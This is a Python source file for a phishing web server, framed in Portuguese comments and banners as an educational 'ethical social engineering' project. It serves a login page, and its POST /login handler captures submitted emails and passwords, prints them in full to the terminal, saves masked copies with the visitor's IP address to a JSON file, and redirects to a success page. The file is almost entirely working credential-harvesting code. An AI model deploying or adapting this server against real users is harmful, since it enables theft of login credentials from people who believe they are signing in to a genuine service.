import http.server
import socketserver
import json
import datetime
from urllib.parse import parse_qs
import os

PORT = 8000

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path.startswith('/assets/'):
            super().do_GET()
            return
            
        if self.path == '/' or self.path == '/index.html':
            self.serve_login_page()
        elif self.path == '/success':
            self.serve_success_page()
        else:
            self.send_error(404, "Página não encontrada")
    
    def do_POST(self):
        if self.path == '/login':
            self.handle_login()
        else:
            self.send_error(404, "Página não encontrada")
    
    def serve_login_page(self):
        try:
            with open('index.html', 'r', encoding='utf-8') as file:
                content = file.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))
            
        except FileNotFoundError:
            self.send_error(404, "Página de login não encontrada")
    
    def serve_success_page(self):
        try:
            with open('success.html', 'r', encoding='utf-8') as file:
                content = file.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))
            
        except FileNotFoundError:
            self.send_error(404, "Página de sucesso não encontrada")
    
    def handle_login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        email = form_data.get('email', [''])[0]
        password = form_data.get('password', [''])[0]
        
        self.log_attempt(email, password)
        self.save_to_json(email, password)
        
        self.send_response(303)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def log_attempt(self, email, password):
        """Registra a tentativa de login no terminal (apenas para demonstração)"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        masked_email = self.mask_email(email)
        masked_password = self.mask_password(password)
        
        print("=" * 60)
        print("🔐 TENTATIVA DE LOGIN CAPTURADA (EDUCACIONAL)")
        print("=" * 60)
        print(f"📅 Timestamp: {timestamp}")
        print(f"📧 E-mail: {email}")
        print(f"🔑 Senha: {password}")
        print(f"🎭 E-mail mascarado: {masked_email}")
        print(f"🎭 Senha mascarada: {masked_password}")
        print("=" * 60)
    
    def save_to_json(self, email, password):
        """Salva as credenciais (parcialmente mascaradas) em arquivo JSON"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Dados para salvar no JSON - SEM raw_email
        login_data = {
            "timestamp": timestamp,
            "email": self.mask_email(email),
            "password": self.mask_password(password),
            "ip_address": self.client_address[0] if hasattr(self, 'client_address') else "N/A"
        }
        
        try:
            with open('login_attempts.json', 'r', encoding='utf-8') as f:
                existing_data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            existing_data = {
                "educational_project": "Engenharia Social Ética",
                "description": "Logs de tentativas de login para fins educacionais",
                "security_notice": "Dados sensíveis são mascarados para proteção. Apenas informações parciais são armazenadas.",
                "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "attempts": []
            }
        
        existing_data["attempts"].append(login_data)
        
        with open('login_attempts.json', 'w', encoding='utf-8') as f:
            json.dump(existing_data, f, indent=2, ensure_ascii=False)
        
        print("💾 Dados salvos em login_attempts.json")
    
    def mask_email(self, email):
        """Mascara o e-mail para exibição segura - MOSTRANDO ALGUNS DÍGITOS"""
        if '@' not in email:
            return "***@******.***"
        
        username, domain = email.split('@')
        
        # Para username: mostrar primeiro caractere, depois asteriscos, depois último caractere
        if len(username) <= 2:
            masked_username = username[0] + '*' * (len(username) - 1)
        else:
            masked_username = username[0] + '*' * (len(username) - 2) + username[-1]
        
        domain_parts = domain.split('.')
        if len(domain_parts) >= 2:
            # Para domínio: mostrar primeiro caractere, asteriscos, e extensão completa
            masked_domain = domain_parts[0][0] + '*' * (len(domain_parts[0]) - 1) + '.' + domain_parts[1]
        else:
            masked_domain = '*****.***'
        
        return f"{masked_username}@{masked_domain}"
    
    def mask_password(self, password):
        """Mascara a senha para exibição segura - COMPLETAMENTE MASCARADA"""
        if not password or len(password) == 0:
            return "********"
        
        # Senha sempre completamente mascarada
        return '*' * 8

def main():
    if not os.path.exists('login_attempts.json'):
        initial_data = {
            "educational_project": "Engenharia Social Ética",
            "description": "Logs de tentativas de login para fins educacionais",
            "security_notice": "Dados sensíveis são mascarados para proteção. Apenas informações parciais são armazenadas.",
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attempts": []
        }
        
        with open('login_attempts.json', 'w', encoding='utf-8') as f:
            json.dump(initial_data, f, indent=2, ensure_ascii=False)
        print("📁 Arquivo login_attempts.json criado com estrutura inicial")
    
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        print("=" * 60)
        print("🎓 SERVIDOR DE ENGENHARIA SOCIAL ÉTICA")
        print("=" * 60)
        print(f"🌐 Servidor rodando na porta {PORT}")
        print(f"🔗 Acesse: http://localhost:{PORT}")
        print("\n📊 Sistema de Logs:")
        print("   • Terminal: Credenciais COMPLETAS (apenas para demonstração)")
        print("   • JSON: E-mail parcialmente mascarado + Senha completamente mascarada")
        print("\n🔒 SEGURANÇA:")
        print("   ✓ E-mails: primeiro e último caractere visíveis")
        print("   ✓ Senhas: completamente mascaradas")
        print("   ✓ Nenhum dado original completo salvo")
        print("\n⚠️  AVISO: Este é um servidor para fins educacionais")
        print("=" * 60)
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Servidor encerrado pelo usuário")

if __name__ == "__main__":
    main()